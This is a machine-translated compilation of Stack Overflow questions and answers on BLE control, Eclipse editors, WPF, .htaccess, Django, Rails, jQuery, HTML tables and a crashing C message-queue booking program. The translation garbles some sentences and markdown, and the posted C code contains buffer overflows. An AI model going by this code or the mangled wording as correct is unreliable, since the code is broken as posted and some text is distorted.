> 赞同：0
> 
> 时间：2015-07-28T08:37:10.357

**即使您的车载 CD 播放器具有 BLE 4.0，您也很可能无法做到这一点。**

使用核心蓝牙设备充当“中央”（客户端）或“外围”（服务器），外围“拥有数据”并公开具有特征（变量）的服务。中央（客户端）从外围设备读取数据或订阅通知。

您唯一的机会是将 CD 播放器作为外围设备（服务器）连接，而您的 iPhone 作为中心设备（客户端）。在这种情况下，CD 播放器必须公开允许您控制它的服务。老实说，我不知道如何做到这一点，因为中央（iPhone）将从外围设备读取数据并接收通知，反之亦然。

互换角色，将 iPhone 实现为外围设备是有道理的，但没有预定义的蓝牙 LE 服务用于远程控制，因此您的车载 CD 播放器不知道您可以期待什么服务。它可能使用 HID 服务（人机接口设备）工作，通常用于键盘和鼠标，但根据这篇[文章](http://dev.mikamai.com/post/109964410059/hid-emulation-on-an-iphone-is-not-allowed)，Apple 在 iOS 上禁止 HID。

# javascript - 具有完整 Outliner 支持的 Eclipse Javascript Editor 2012

> ID：11309953
> 
> 赞同：17
> 
> 时间：2012-07-03T11:28:31.197
> 
> 标签：javascript, eclipse, codehighlighter, outliner, object-notation

使用an的原因`IDE`是它提供的综合设施。

因此，我假设`Javascript`Eclipse 有一个编辑器，它提供了基本的基于大纲的`IDE`工具，例如：

*   **带支持的**大纲**`Object Literal`（显然很少见）**
***   使用数据的智能**代码完成**`Outliner`*   使用数据的智能**代码突出显示**`Outliner`，而不仅仅是相似的词*   文件间作用域 ( `@include "otherfile.js"`)**

 **但是，对于`Javascript`，这些功能似乎分散在多个编辑器中：

*   [Amateras Javascript 编辑器](http://amateras.sourceforge.jp/cgi-bin/fswiki_en/wiki.cgi)
    +**文件间范围**（从某些代码结构自动使用外部文件）
    - 没有代码突出显示
    - 没有对象文字概述
*   [Javascript 编辑器](http://www.eclipse.org/webtools/jsdt/)(Eclipse WDT JSDT)
    +用于读写的**智能代码突出显示**
    - 没有文件间范围
    - 没有对象文字概述
*   [Javascript 源代码编辑器](http://www.aptana.com/products/studio3/download)（Aptana 插件）
    +**对象文字被完整概述**
    - 假（相似词）代码突出显示
    - 没有文件间范围
*   [Spket Javascript 编辑器](http://www.spket.com/javascript-editor.html)
    〜**对象文字部分概述**
    - 假（相似词不同的变量）代码突出显示
    - 没有文件间范围
*   [VJET Ebay 开源 Javascript 编辑器](https://www.ebayopensource.org/index.php/VJET/HomePage)
    -[我无法让它工作](https://stackoverflow.com/questions/12072633/how-do-i-properly-run-the-vjet-development-tools-for-nodejs-on-eclipse)，但它应该是更好的项目之一。

Javascript 是一种非常流行的语言，并且越来越多的框架（例如，`ExtJS`仅依赖于 JSON- *like* `Object Notation`）。

是否有任何`Javascript`Eclipse 编辑器提供完整的 Outliner 支持？这些开发人员（例如 for `ExtJS`）如何促进他们`Javascript`对现代框架的开发？

虽然缺乏细节，但总体而言，这是一个很好且受欢迎的问题，但尚未得到满意的回答：

*   [Javascript 编辑器 '08](https://stackoverflow.com/questions/24678/eclipse-javascript-editor)
*   [Javascript 编辑器 '10](https://stackoverflow.com/questions/4025444/eclipse-javascript-editor-10)

*请注意，开发人员取决于`IDE`偏好和其他`Eclipse`插件，例如[Chome 开发人员工具](https://code.google.com/p/chromedevtools/)和`V8 Debugger`. 因此，这个问题的范围**仅限于 Eclipse 插件**。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:36:57.383

如果您想要最好的 JavaScript 编辑器（不是免费的），请使用JetBrains的[PhpStrom](http://www.jetbrains.com/phpstorm/)

您可以使用一个月的试用期，这将满足您的所有要求。

如果您想使用开源，那么我建议您使用[Aptana](http://aptana.com/)。

希望这能解决你的问题:)**

# c# - 如何使 GridSplitter “捕捉”到另一个元素？

> ID：11309955
> 
> 赞同：0
> 
> 时间：2012-07-03T11:28:49.637
> 
> 标签：c#, .net, wpf

我有一个数据网格和一个网格拆分器：

![在此处输入图像描述](../Images/dc832a25989abbdab9d01f3b95d188f6.png)

拆分器位于底部，数据网格位于顶部，两者之间有一些空白空间。

我认为，如果网格拆分器与数据网格相距 24 个或更少的单位，它会卡入数据网格中，它会正常工作。这可以存档吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-05T13:49:04.630

我用它来捕捉每个数据网格行：

```
private void GridSplitterDragCompleted(object sender, DragCompletedEventArgs e)
{
    // We want the grid splitter to snap in grid of 24 units.
    var excess = (int) FooDataGridRowDefinition.Height.Value % 24;

    if (excess == 0)
        return;

    FooDataGridRowDefinition.Height = new GridLength(FooDataGridRowDefinition.Height.Value - excess);
} 
```

数据网格行对我来说都是 24 行，我想我可以动态地获取它们，但现在就可以了。

XAML：

```
<Grid>
    <Grid.RowDefinitions>
        <RowDefinition Height="*" />
        <RowDefinition Height="Auto" Name="FooDataGridRowDefinition" />
        <RowDefinition Height="*" />
    </Grid.RowDefinitions>

    <DataGrid Grid.Row="0" />

    <GridSplitter Grid.Row="1" DragCompleted="GridSplitterDragCompleted" />

    <Foo Grid.Row="2" />
</Grid> 
```

# .htaccess - 在 Htaccess 中重定向之前删除 .html

> ID：11309956
> 
> 赞同：0
> 
> 时间：2012-07-03T11:28:50.557
> 
> 标签：.htaccess, redirect

我有以下完美的规则，但是我的旧网站网址有 .html 而我的新网站没有。是否可以在重定向之前剥离 .html？例如

www.oldsite.com/mypage.html

被重定向到

www.newsite.com/subdir/mypage/

例如

```
Options +FollowSymLinks 
RewriteEngine on

RewriteCond %{HTTP_HOST} ^www.oldsite.com$ [NC]
RewriteRule ^(.*)$ http://www.newsite.co.uk/subdir/$1 [R=301,L] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:17:24.540

```
Options +FollowSymLinks 
RewriteEngine on

RewriteCond %{HTTP_HOST} ^www.oldsite.com$ [NC]
RewriteRule ^(.*)\.html$ http://www.newsite.co.uk/subdir/$1 [R=301,L] 
```

所以`www.oldsite.com/mypage.html`将被重定向到`www.newsite.com/subdir/mypage`

# opencv - cvBlobsLib VS2008 崩溃

> ID：11309958
> 
> 赞同：-1
> 
> 时间：2012-07-03T11:28:57.133
> 
> 标签：opencv

我正在使用 cvBlobsLib 库进行 blob 检测工作，但是，我在代码中的程序中遇到了崩溃。我的代码此时崩溃：

```
CBlobResult blobs;
blobs = CBlobResult(imageSkinPixels, NULL, 0); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T12:32:56.500

`imageSkinPixels`必须是单通道图像：换句话说，您需要将 RGB 图像转换为灰色，然后再将其传递给`CBlobResult()`.

另外，我们不知道 的类型是什么`imageSkinPixels`，但它应该是指向 的指针`IplImage`。

这就是我可以用你分享的代码说的。如果这不能解决问题，您将需要共享更多代码。

# python - 如何在 django cms 中设计页面

> ID：11309960
> 
> 赞同：0
> 
> 时间：2012-07-03T11:29:14.800
> 
> 标签：python, django

我想在 django 中设计一个页面，该页面有一个搜索栏，用户可以在其中输入关键字以在 10 个 xml 文档中进行搜索。我设计了用于使用 xml 解析搜索单词的 python 代码。我还在 django 中开发了一个名为“**搜索**”的应用程序，但该应用程序必须有我想要设计的这个页面。现在，我的应用程序正在从终端获取输入，但我希望通过我将设计的这个网页输入单词。我怎样才能做到这一点？

这是我的代码，将位于后端：

```
#!/usr/bin/python

import sys 
sys.path.insert(0,'/home/pooja/Desktop/mysite')

#to tell django which settings module to use 
import os
os.environ['DJANGO_SETTINGS_MODULE'] = 'mysite.settings'

from search.models import Keywords 

from skey import find_root_tags, count, sorting_list

str1 = raw_input("enter the word to be searched\n")  # taking input from user on terminal but I want it to be taken through that page
list = []
fo = open("xml.txt","r")

for i in range(count.__len__()):

    file = fo.readline()
    file = file.rstrip('\n')
    find_root_tags(file,str1,i) 

    list.append((file,count[i]))

sorting_list(list)

for name, count in list:
    s = Keywords(file_name=name,frequency_count=count)
    s.save()

fo.close() 
```

这里 django_project = mysite #my project's name and app = search #my app's name

请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T12:00:32.880

使用表单在搜索应用程序中创建视图并接收搜索键和...

看到这些页面

*   姜戈 | 使用表格 | Django 文档 -> [https://docs.djangoproject.com/en/dev/topics/forms/](https://docs.djangoproject.com/en/dev/topics/forms/)

*   姜戈 | 撰写意见 | Django 文档 ->
    [https://docs.djangoproject.com/en/dev/topics/http/views/](https://docs.djangoproject.com/en/dev/topics/http/views/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T12:13:53.170

您当前正在使用 Django 的数据库模型（即 Keywords）。要添加网页输入，典型的方法是使用：

1.  一个 Django 模板——即用 Django 特定的模板标记代码注释的 HTML——它包括一个带有搜索字段和提交按钮的 HTML 表单。

2.  一个为上面的模板提供后端逻辑的 Django 视图——即一个 Python 函数，它（1）首先向用户显示空的搜索表单（来自上面的模板），（2）接收用户的搜索输入（通过用户单击提交时触发的 Django“请求”），使其被处理（按照上面代码中的行），并且可能会回复“谢谢，搜索已处理”或其他任何内容（通过 Django 的“响应”为您处理）。

3.  一个 Django URLconf 配置行（在您的项目的 settings.py 模块中），它告诉 Django 将您想要用于搜索界面的任何 URL 路由到上面的视图。

如果这些东西对你来说是新的，我建议花一些时间[阅读在线 Django Book](http://www.djangobook.com/en/2.0/)，尤其是关于[Views 和 URLconfs](http://www.djangobook.com/en/2.0/chapter03/)、[Templates](http://www.djangobook.com/en/2.0/chapter04/)和[Forms](http://www.djangobook.com/en/2.0/chapter07/)的章节。请注意，关于表单的章节实际上使用了一个与您尝试做的类似的简单搜索示例，希望这对展示所有部分如何组合在一起特别有用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T12:00:02.963

阅读如何在 Django 文档中创建表单：[https ://docs.djangoproject.com/en/1.4/topics/forms/](https://docs.djangoproject.com/en/1.4/topics/forms/)

# ruby-on-rails - 自动完成相关字段 - Rails

> ID：11309962
> 
> 赞同：0
> 
> 时间：2012-07-03T11:29:22.303
> 
> 标签：ruby-on-rails, autocomplete

这些是我认为的字段，零件代码上的自动完成功能会从零件代码表中显示零件代码列表。根据选择的零件代码，我希望它使用零件代码表中的描述动态更新描述。

```
<div class="field">
<%= f.label "partcode" %><br />
<%=f.autocomplete_field :partcode, "/goods_ins/1/autocomplete_partcode_partcode" %>
</div>    
<div class="field">
<%= f.label "description" %><br />
<%= f.text_field :description, :autocomplete => :off %>
</div> 
```

这是我的路线：

```
resources :goods_ins do
  get :autocomplete_partcode_partcode, :collection => {:view => :get} 
end 
```

我的控制器：

```
autocomplete  :partcode, :partcode, :extra_data => [:description] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T13:24:08.457

使用以下方式，

首先为您的文本字段提供 id，如下所示

```
<%= f.text_field :description,:autocomplete=>:off, :id_element=>'#part_desc'%> 
```

现在使用上面的元素 id 设置 update_elements 属性，如下所示

```
<%=f.autocomplete_field :partcode, "/goods_ins/1/autocomplete_partcode_partcode",:update_elements=>{:id =>'#part_code', :description=>'#part_desc'} %> 
```

# jquery - 使用 JQuery 隐藏单击 RadioButtonList 的面板

> ID：11309967
> 
> 赞同：2
> 
> 时间：2012-07-03T11:29:30.680
> 
> 标签：jquery, .net

我有一个 asp:RadioButtonList 和一个面板

```
<asp:RadioButtonList ID="someList" runat="server"    
RepeatDirection="Horizontal" CssClass="radioList">
    <asp:ListItem Text="Yes" Value="1"></asp:ListItem>
    <asp:ListItem Text="No" Value="4"></asp:ListItem>
    <asp:ListItem Text="Don't Know" Value="2"></asp:ListItem>                                        
</asp:RadioButtonList>
<asp:Panel ID="Panel1" runat="server" Style="display: none;">
This is panel 1
</asp:Panel> 
```

当我单击“是”时，应该显示面板，当我单击“否”和“不知道”时，应该隐藏面板。帮助将不胜感激谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:36:01.933

尝试这个：

```
var panel = $("#Panel1"); 
$("input[name='cboVisibility']").change(function () { 
  if ($(this).val() == 1) panel.show(); 
  else panel.hide() 
}) 
```

[http://jsfiddle.net/KevQv/](http://jsfiddle.net/KevQv/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:37:25.840

```
 var panel = $("#<%= this.Panel1.ClientID %>")  
  $(".radioList").change(function(){
           if($(this).val() == 1)
              panel.show();
           else
              panel.hide()

    }) 
```

# html - 设置 HTML 表格列宽

> ID：11309970
> 
> 赞同：1
> 
> 时间：2012-07-03T11:29:43.307
> 
> 标签：html, css

我有一张简单的桌子。

```
<table border="1" width="100%">
        <tr>
                <th>Select</th>
                <th>Name</th>
                <th>Preview</th>
        </tr> 
```

如何设置宽度，使选择和预览为 15px，名称为剩下的宽度？？？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T11:33:02.127

嘿，现在你可以像这样在你的 CSS 中定义

**CSS**

```
 .some{
    width:15px;
    } 
```

HTML

```
<table border="1" width="100%">
        <tr>
                <th class="some">Select</th>
                <th>Name</th>
                <th  class="some">Preview</th>
        </tr>
</table> 
```

现场演示 [http://tinkerbin.com/n4Q1NOXW](http://tinkerbin.com/n4Q1NOXW)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:31:12.470

```
<table border="1" width="100%">
        <tr>
                <th width="15">Select</th>
                <th>Name</th>
                <th width="15">Preview</th>
        </tr> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:31:45.607

你可以用作

```
<table border="1" width="100%">
   <tr>
        <th width="15px">Select</th>
        <th>Name</th>
        <th width="15px">Preview</th>
   </tr> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T13:38:28.823

```
<table border="1px" width="100%">
   <tr>
        <th width="15px">Select</th>
        <th>Name</th>
        <th width="15px">Preview</th>
   </tr>
</table>​​​​​​​​​​​​​​​​​​​​​ 
```

如果你想在任何尺寸的屏幕中根据它们的尺寸进行预览，使用'%'来确定尺寸。例如

```
<table border="1px" width="100%">
   <tr>
        <th width="15%">Select</th>
        <th>Name</th>
        <th width="15%">Preview</th>
   </tr>
</table>​​​​​​​​​​​​​​​​​​​​​ 
```

# php - 如何在 symfony sfWidgetFormDate 中仅显示日期，但它应该将月份和日期作为默认的“1”传递？

> ID：11309978
> 
> 赞同：0
> 
> 时间：2012-07-03T11:30:07.920
> 
> 标签：php, date, symfony1, widget, symfony-1.4

我必须单独显示日期，`sfWidgetFormDate`但我希望隐藏日期和月份。

我给了：

```
$this->widgetSchema['fellowship_admission_date'] = new sfWidgetFormFilterDate(array(
  'from_date'  => new sfWidgetFormDate(array('format' => '%year%')), 
  'to_date'    => new sfWidgetFormDate(array('format' => '%year%')), 
  'with_empty' => false
)) 
```

它只显示年份，但我想在“from_date”和“to_date”中传递月份和日期，默认为“1”作为隐藏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-04T09:26:07.530

为什么不显示整个日期，并用 jQuery 隐藏日期和月份？！
这可能是一个好的和快速的解决方案......

# c - 在 C 中预订客户端-服务器时检测到堆栈粉碎

> ID：11309979
> 
> 赞同：0
> 
> 时间：2012-07-03T11:30:08.283
> 
> 标签：c, stack, client-server

嗨，我在 C 中的客户端服务器程序遇到了这个问题。这应该是一个非常简单的预订系统......请有人可以帮助我，我不知道如何解决（C 中的第一个项目）。提前致谢

**客户端.c**

```
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/signal.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>

#define ERRORE -1
#define FLAG 0
#define SIZE 128
#define R 3
#define C 5

typedef struct {
int response_channel;
int service_code;
} request;

typedef struct {
long mtype;
request req;
} request_msg;

typedef struct {
long mtype;
int posti[R][C];
} response_msg;

/*strutture per cancella*/
typedef struct {
int response_channel;
int service_code;
char codice[5];
} request_canc;

typedef struct {
long mtype;
request_canc req;
} request_msg_canc;

typedef struct {
long mtype;
char risp[256];
} response_msg_canc;
//************************************************//

/* strutture per prenota*/
typedef struct {
int response_channel;
int service_code;
int posti[R][C];
} request_pren;

typedef struct {
long mtype;
request_pren req;
} request_msg_pren;

//**********************//

int my_id_coda,id_coda, ret, STATUS;
long key;
int sala[R][C];

request_msg request_message;
response_msg response_message;

/*variabili per cancella*/
request_msg_canc request_message_canc;

request_msg_pren posti_p;

void visualizza();
void prenota();
void cancella();
int menu();

main(int argc, char *argv[]) {
int scelta,ris;

key = getpid();

my_id_coda = msgget(key, IPC_CREAT|IPC_EXCL|0666);
if( my_id_coda == -1){
my_id_coda = msgget(key, IPC_CREAT|0666);
ret = msgctl(my_id_coda,IPC_RMID,0);
my_id_coda = msgget(key, IPC_CREAT|IPC_EXCL|0666);
if( my_id_coda == -1 ){
printf("cannot install client queue, please check with the problem\n");
exit(-1);
}
}

id_coda = msgget(50, IPC_CREAT|0666);
if( id_coda == -1 ){
printf("cannot open server queue, please check with the problem\n");
exit(-1);
}

/*qui mancava il richiamo al menu*/

do{

int a;
printf("1 visualizza;\n");
printf("2 prenota;\n");
printf("3 cancella;\n");
printf("4 esci;\n");
scanf("%d",&a);

scelta = a;

switch(scelta) {
case 1: visualizza(); break;
case 2: prenota(); break;
case 3: cancella(); break;
}
}while(scelta != 4); 
ris=msgctl(my_id_coda,IPC_RMID,0);
if(ris==-1)printf("Errore nella chiamata msgctl");
exit(-1);

}/* end main*/

void visualizza() {
int i,j;
request_message.mtype = 1;
request_message.req.service_code = 1;
request_message.req.response_channel = my_id_coda;
printf("response channel has id %d\n",my_id_coda);

if ( msgsnd(id_coda, &request_message, sizeof(request), FLAG) == -1 ) {
printf("cannot send request to the server\n");
exit(-1);
}

if ( msgrcv(my_id_coda, &response_message, sizeof(response_msg), 1, FLAG) == -1) { 
printf("error while receiving the server response, please check with the problem\n");
exit(-1);
}
else {

memcpy((char*)sala,(char*)response_message.posti,128);
printf("\nla sala Ã¨:\n");
for(i=0;i<R;i++){
for(j=0;j<C;j++){
printf("%d ",sala[i][j]);
}
printf("\n");
}

}
}

void prenota(){

int i,j;
int numero=0;
int fila=0;
int poltrona=0;
response_msg_canc risposta_codice;

for(i=0;i<R;i++)
for(j=0;j<C;j++)
posti_p.req.posti[i][j]=0;
numero=0;
while(numero>R*C || numero<=0){
printf("Digitare il numero di posti che si vuole prenotare compreso tra 1 e %d\n",R*C);
scanf("%d",&numero);
}
for(i=0;i<numero;i++){
printf("Digitare il %dÂ° posto nel formato 'fila poltrona' con fila compresa tra 1..%d e poltrona tra 1..%d \n",i+1,R,C);
scanf("%d%d",&fila,&poltrona);
/*scanf("%d",&fila);
scanf("%d",&poltrona);*/
if(fila<=0 || fila>R || poltrona<=0 || poltrona>C){
printf("ERRORE\n");
i--;
}
else {posti_p.req.posti[fila-1][poltrona-1]=1;}
}

for(i=0;i<R;i++){
for(j=0;j<C;j++){
printf("%d",posti_p.req.posti[i][j]);
}
printf("\n");
}
posti_p.mtype = 2;
posti_p.req.service_code = 2;

posti_p.req.response_channel = my_id_coda;

if ( msgsnd(id_coda, &posti_p, sizeof(request_pren), FLAG) == -1 ) {
printf("cannot send request to the server\n");
exit(-1);
}

if ( msgrcv(my_id_coda, &risposta_codice, sizeof(response_msg_canc), 2, FLAG) == -1) { 
printf("error while receiving the server response, please check with the problem\n");
exit(-1);
}
printf("%s\n",risposta_codice.risp);

} 

/* metodo cancella*/

void cancella(){ 
int i,j;
char preno[5];
response_msg_canc risposta;

request_message_canc.mtype = 3;
request_message_canc.req.service_code = 3;

printf("Inserire codice prenotazione da cancellare:");
scanf("%s",preno);
strcpy(request_message_canc.req.codice,preno);

request_message_canc.req.response_channel = my_id_coda;
printf("response channel has id %d\n",my_id_coda);

if ( msgsnd(id_coda, &request_message_canc, sizeof(request_canc), FLAG) == -1 ) {
printf("cannot send request to the server\n");
exit(-1);
}

if ( msgrcv(my_id_coda, &risposta,sizeof(response_msg_canc), 3, FLAG) == -1) { 
printf("error while receiving the server response, please check with the problem\n");
exit(-1);
}
risposta.risp[255]='\0';
printf("%s\n",risposta.risp);
} 
```

**服务器.c**

```
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/signal.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <math.h>
#include<stdlib.h>
#include<string.h>
#include <sys/sem.h>

#define ERRORE -1
#define FLAG    0
#define SIZE  128
#define R 3
#define C 5
#define CINEMA "prenotazione"
#define STDOUT 1

typedef struct {
    int response_channel;
    int service_code;
} request;

typedef struct {
    int response_channel;
    int service_code;
    char codice[5];
} request_canc;

typedef struct {
    long mtype;
    request_canc req;
} request_msg_canc;

typedef struct {
    long mtype;
    request req;
} request_msg;

typedef struct {
    long mtype;
    int posti[R][C];
} response_msg;

typedef struct {
    char pren[6];
} codice;

typedef struct {
    long mtype;
    char risp[256];
} response_msg_canc;

/* strutture per prenota*/
typedef struct {
    int response_channel;
    int service_code;
    int posti[R][C];
} request_pren;

typedef struct {
    long mtype;
    request_pren req;
} request_msg_pren;

//**********************//

codice prenotazioni[R][C];
int id_coda, ret;
long key = 50;

request_msg  request_message;
request_msg  *new_message;
pthread_t tid;
response_msg response_message;

request_msg_canc request_mes_canc;
request_msg_canc *new_mes_canc;

request_msg_pren request_mes_pren;
request_msg_pren *new_mes_pren;

int ds_shm;

int id_sem;

void ito(int,char*);
int crea_init_sem(key_t,int);
void elimina_sem(int);
int sem_wait(int);
int sem_signal(int);
void visualizza(request_msg*);
void prenota (request_msg_pren*);
void cancella (request_msg_canc*);

main(int argc, char *argv[]) {
    codice prenot[3][5];

    int sd,size,occ,i,j,status,eli;
    long chiave=10,chiave_sem=50;

    char buff[5],app[5],*p,*scorri_mem;

    sd=open(CINEMA,O_RDONLY);

    ds_shm = shmget(chiave,sizeof(codice[3][5]),IPC_CREAT|0666);
    if( ds_shm == -1) {printf("Errore nella chiamata shmget\n"); exit(1);}

    p = shmat(ds_shm, 0, SHM_W);
    if(p==(char*)-1){printf("Errore nella chiamata shmat\n"); exit(1);}
    scorri_mem=p;
    for(i=0;i<R;i++){
       for(j=0;j<C;j++){
       size=read(sd,buff,5);
       memcpy((char*)app,(char*)buff,size);
       strncpy(scorri_mem,app,5);
       *(scorri_mem+5)='\0';
       printf("%s",scorri_mem);
       scorri_mem+=6;
       }
    }
    id_sem=crea_init_sem(chiave_sem,1);

    id_coda = msgget(key, IPC_CREAT|IPC_EXCL|0666);
    if( id_coda == -1){
    id_coda = msgget(key, IPC_CREAT|0666);
    ret = msgctl(id_coda,IPC_RMID,0);
    id_coda = msgget(key, IPC_CREAT|IPC_EXCL|0666);
    if( id_coda == -1 ){
        printf("cannot install server queue, please check with the problem\n");
        exit(-1);
    }
    }

    //close(sd);
    if(fork()==0){ 

    while(1) {

    if ( msgrcv(id_coda, &request_message, sizeof(request), 1, FLAG) == -1) { 
        printf("message receive error, please check with the problem\n");
    }
    else {

            new_message = malloc(sizeof(request_msg));
        if(!new_message){
            printf("cannot allocate new request message buffer \n");
            exit(-1);
        }
        memcpy((char*)new_message,(char*)&request_message,sizeof(request_msg));  

        if( pthread_create(&tid, NULL, visualizza, (void *)new_message) != 0){
            printf("cannot create new thread \n");
            exit(-1);
        }

    }
    }/* end while */
  }/* end fork*/

  // prenota
  if(fork()==0){while(1) {

    if ( msgrcv(id_coda, &request_mes_pren, sizeof(request_pren), 2, FLAG) == -1) { 
        printf("message receive error, please check with the problem\n");
    }
    else {

            new_mes_pren = malloc(sizeof(request_msg_pren));
        if(!new_mes_pren){
            printf("cannot allocate new request message buffer \n");
            exit(-1);
        }
        memcpy((char*)new_mes_pren,(char*)&request_mes_pren,sizeof(request_pren));   

        if( pthread_create(&tid, NULL, prenota, (void *)new_mes_pren ) != 0){
            printf("cannot create new thread \n");
            exit(-1);
        }

    }
    }/* end while */
  }/* end fork*/

  // cancella
    if(fork()==0){ while(1) {

    if ( msgrcv(id_coda, &request_mes_canc, sizeof(request_canc), 3, FLAG) == -1) { 
        printf("message receive error, please check with the problem\n");
    }
    else {

            new_mes_canc = malloc(sizeof(request_msg_canc));
        if(!new_mes_canc){
            printf("cannot allocate new request message buffer \n");
            exit(-1);
        }
        memcpy((char*)new_mes_canc,(char*)&request_mes_canc,sizeof(request_canc));   

        if( pthread_create(&tid, NULL, cancella, (void *)new_mes_canc ) != 0){
            printf("cannot create new thread \n");
            exit(-1);
        }

    }
    }/* end while */
  }/* end fork*/
    wait(&status);
    eli=msgctl(ds_shm,IPC_RMID,NULL);
    if(eli == -1) printf("Errore nella chiamata msgctl");
    elimina_sem(id_sem);
}

void visualizza(request_msg *request_message){

    int status,i,j,occ;
    char *p;

    printf("asked service of type %d - response channel is %d\n", request_message->req.service_code,request_message->req.response_channel); 

    response_message.mtype = 1;

    p = shmat(ds_shm, 0, SHM_R);
    if(p==(char*)-1){printf("Errore nella chiamata shmat\n"); exit(1);}

    for(i=0;i<R;i++){
       for(j=0;j<C;j++){
       strncpy(prenotazioni[i][j].pren,p,6);
       p+=6;
       }
    }

    for(i=0;i<R;i++)
       for(j=0;j<C;j++){
       occ=strncmp(prenotazioni[i][j].pren,"0000",4);
       if(occ==0) response_message.posti[i][j]=0;
       else response_message.posti[i][j]=1;
      }

    if ( msgsnd(request_message->req.response_channel, &response_message, sizeof(response_msg), FLAG) == -1 ) {
    printf("cannot return response to the client\n");
    exit(-1);
    }
    i=shmdt(p);
    free(request_message);
    status = 0;
    pthread_exit((void *)&status);

}

void prenota (request_msg_pren *request_mes_pren){

    response_msg_canc risposta_pren;
    int status,occ,i,j,dist,trovato,cod,sd,doppio,conta=0;
    char *p,c[6],*scorri_mem;

    risposta_pren.mtype = 2;

    sem_wait(id_sem);

     p = shmat(ds_shm, 0, SHM_R);

    if(p==(char*)-1){printf("Errore nella chiamata shmat\n"); exit(1);}
    scorri_mem=p;
    for(i=0;i<R;i++){
       for(j=0;j<C;j++){
       strncpy(prenotazioni[i][j].pren,scorri_mem,6);
       scorri_mem+=6;
       }
    }
    scorri_mem=p;

    for(i=0;i<R;i++)
       for(j=0;j<C;j++){
       occ=strncmp(prenotazioni[i][j].pren,"0000",4);
       if(occ==0) response_message.posti[i][j]=0;
       else response_message.posti[i][j]=1;
      }

    for(i=0;i<R;i++)
       for(j=0;j<C;j++){
         if(request_mes_pren->req.posti[i][j]==1)
           if(request_mes_pren->req.posti[i][j]==response_message.posti[i][j])
               trovato=1;
          if(request_mes_pren->req.posti[i][j]==0) conta++;  
       }
     i=shmdt(p);
     p = shmat(ds_shm, 0, SHM_R);
     scorri_mem=p;
    if(trovato==1 || conta==(R*C)){  strcpy(risposta_pren.risp,"prenotazione non effettuata");} 
    else {
          do{
          cod=random();
          ito(cod,c);
      doppio=0; 
       for(i=0;i<R;i++){
           for(j=0;j<C;j++){
           occ=strncmp(prenotazioni[i][j].pren,c,4);
           if(occ==0) {doppio=1;break;}
           }
       }
      }while(doppio==1); 
       strcpy(risposta_pren.risp,"prenotazione effettuata con codice: ");
       strncat(risposta_pren.risp,c,6);

       i=shmdt(p);
       p = shmat(ds_shm, 0, SHM_W);
       scorri_mem=p;
       for(i=0;i<R;i++){
            for(j=0;j<C;j++){
        if(request_mes_pren->req.posti[i][j]==1){

           strncpy(scorri_mem,c,6);
                  if(j<(C-1)) *(scorri_mem+4)=' ';
              else (*(scorri_mem+4)='\n');
            }
          *(scorri_mem+5)='\0';
          scorri_mem+=6;
              }
            }
     }
     close(STDOUT);
     scorri_mem=p;
     sd=open(CINEMA,O_RDWR|O_TRUNC);
     dup(sd);
      for(i=0;i<R;i++){
       for(j=0;j<C;j++){
       write (sd,scorri_mem,5);
       scorri_mem+=6;
       }
         }
     //fflush(STDOUT);

    if ( msgsnd(request_mes_pren->req.response_channel, &risposta_pren, sizeof(response_msg_canc), FLAG) == -1 ) {
    printf("cannot return response to the client\n");
    exit(-1);
    }
    close(sd);
    sem_signal(id_sem);
    free(request_mes_pren);
    status = 0;
    pthread_exit((void *)&status);

}

void cancella (request_msg_canc *request_mes_canc){

    response_msg_canc risposta;
    int status,occ,i,j,dist,sd,trovato=0;
    char *p,*scorri_mem;

    risposta.mtype = 3;

    p = shmat(ds_shm, 0, SHM_W);
    if(p==(char*)-1){printf("Errore nella chiamata shmat\n"); exit(1);}
    scorri_mem=p;
    for(i=0;i<R;i++)
       for(j=0;j<C;j++){
       occ=strncmp(scorri_mem,request_mes_canc->req.codice,4);
       if(occ==0) {
                trovato++;
                    if(j<C-1){ strcpy(scorri_mem,"0000 \0");}
                else     { strcpy(scorri_mem,"0000\n");}
              }
       scorri_mem+=6;
    }
     i=shmdt(p);

    sd=open(CINEMA,O_RDWR|O_TRUNC); 
    p = shmat(ds_shm, 0, SHM_R);
    scorri_mem=p;

    for(i=0;i<R;i++){
       for(j=0;j<C;j++){
        write(sd,scorri_mem,5);
        scorri_mem+=6;
       }
    }

        if(trovato>0)  strcpy(risposta.risp,"cancellazione effettuata");
    else       {   strcpy(risposta.risp,"codice inesistente");}

    if ( msgsnd(request_mes_canc->req.response_channel, &risposta, sizeof(response_msg_canc), FLAG) == -1 ) {
    printf("cannot return response to the client\n");
    exit(-1);
    }

    close(sd);
    i=shmdt(p);
    free(request_mes_canc);
    status = 0;
    pthread_exit((void *)&status);

}

void ito(int casuale,char c[]){

    div_t divisione;
    int i,k,j,num=1;

    if(casuale > 999999999) k=9;
    else k=8;

    for(j=0;j<k;j++)
       num=num*10;

    for(i=0;i<4;i++){
       divisione= div(casuale,num);
       switch(divisione.quot) {
       case 0: c[i]='0'; break;
       case 1: c[i]='1'; break;
       case 2: c[i]='2'; break;
       case 3: c[i]='3'; break;
       case 4: c[i]='4'; break;
       case 5: c[i]='5'; break;
       case 6: c[i]='6'; break;
       case 7: c[i]='7'; break;
       case 8: c[i]='8'; break;
       case 9: c[i]='9'; break;
      }
      casuale=divisione.rem;
      num=num/10;;
